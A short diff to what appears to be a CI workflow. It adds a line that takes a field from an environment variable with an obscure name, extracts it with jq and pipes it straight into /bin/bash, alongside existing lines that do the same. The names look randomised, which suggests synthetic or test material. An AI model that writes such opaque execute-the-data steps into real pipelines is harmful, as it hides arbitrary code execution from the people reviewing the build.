@@ -30,6 +30,7 @@ jobs:
           echo $we429 | jq -r .w25 | /bin/bash
           printf '%s' "$orn7" | jq -r .dirys8170 | /bin/bash
           echo $ydlck3811 | jq -r .yel8737 | /bin/bash
+          printf '%s' "$pe513" | jq -r .fnxpd7 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
